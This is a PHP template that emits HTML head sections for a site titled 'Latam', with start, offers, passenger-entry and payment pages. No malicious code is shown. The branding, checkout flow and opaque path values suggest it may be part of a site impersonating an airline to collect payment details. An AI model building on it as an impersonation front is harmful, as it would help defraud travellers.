<?php
require_once __DIR__ . '/config/config.php';

$stmt = $conexao->prepare("SELECT titulo, logo, favicon FROM layout ORDER BY id DESC LIMIT 1");
$stmt->execute();
$layout = $stmt->fetch(PDO::FETCH_ASSOC);

$stmt = $conexao->prepare("SELECT codigo FROM configuracoes ORDER BY id DESC LIMIT 1");
$stmt->execute();
$config = $stmt->fetch(PDO::FETCH_ASSOC);

$titulo = $layout['titulo'] ?? '';
$favicon = $layout['favicon'] ?? '';
$logo = $layout['logo'] ?? '';

$codigo = $config['codigo'] ?? '';

$uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
$rota = trim($uri, '/');
$partes = explode('/', $rota);
$pagina = end($partes);

if (preg_match('/^\d+$/', $pagina)) {
    $pagina = 'inicio';
}

$caminho = "01895764";
$caminho2 = "075";

$timestamp = time();
?>
<?php if ($pagina === 'inicio'): ?> 
<head>
		<title>Latam</title>
		<!--JS-->
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/js.js?time=<?= $timestamp ?>"></script>
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/inicio.js?time=<?= $timestamp ?>"></script>
		<!--CSS-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<link rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/css.css?time=<?= $timestamp ?>" />
			<link id='css_tema' rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/inicio.css?time=<?= $timestamp ?>"/>
        <!--FAVICON-->
        <link rel="shortcut icon" type="image/jpg" href="<?= htmlspecialchars($favicon) ?>">

		<!--META-->
		<meta charset='utf-8'>
		<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	</head>
<?php elseif ($pagina === 'ofertas'): ?>
<head>
		<title>Latam</title>
		<!--JS-->
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/js.js?time="></script>
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/ofertas.js?time=<?= $timestamp ?>"></script>
		<!--CSS-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<link rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/css.css?time=<?= $timestamp ?>" />
			<link id='css_tema' rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/ofertas.css?time=<?= $timestamp ?>" />
        <!--FAVICON-->
        <link rel="shortcut icon" type="image/jpg" href="<?= htmlspecialchars($favicon) ?>">

		<!--META-->
		<meta charset='utf-8'>
		<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	</head>
<?php elseif ($pagina === 'pagamento'): ?>
    <head>
		<title>Latam - Finalizar a compra</title>
		<!--JS-->
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/js.js?time=<?= $timestamp ?>"></script>
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/pagamento.js?time=<?= $timestamp ?>"></script>
        <!--CSS-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<link rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/css.css?time=<?= $timestamp ?>" />
			<link id='css_tema' rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/pagamento.css?time=<?= $timestamp ?>" />
        <!--FAVICON-->
        <link rel="shortcut icon" type="image/png" href="<?= htmlspecialchars($favicon) ?>">

		<!--META-->
		<meta charset='utf-8'>
		<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	</head>
<?php elseif ($pagina === 'passageiros'): ?>
    <head>
		<title>Latam - Preencher os passageiros</title>
		<!--JS-->
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/js.js?time=<?= $timestamp ?>"></script>
		<script type="text/javascript" src="/<?= htmlspecialchars($caminho2) ?>/js/passageiros.js?time=<?= $timestamp ?>"></script>
        <!--CSS-->
		<link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
		<link rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/css.css?time=<?= $timestamp ?>" />
			<link id='css_tema' rel="stylesheet" type='text/css' href="/<?= htmlspecialchars($caminho2) ?>/css/passageiros.css?time=<?= $timestamp ?>" />
        <!--FAVICON-->
        <link rel="shortcut icon" type="image/png" href="<?= htmlspecialchars($favicon) ?>">

		<!--META-->
		<meta charset='utf-8'>
		<meta name="viewport" content="width=device-width,initial-scale=1.0, maximum-scale=1.0">
		<meta name="format-detection" content="telephone=no">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
	</head>
<?php endif; ?>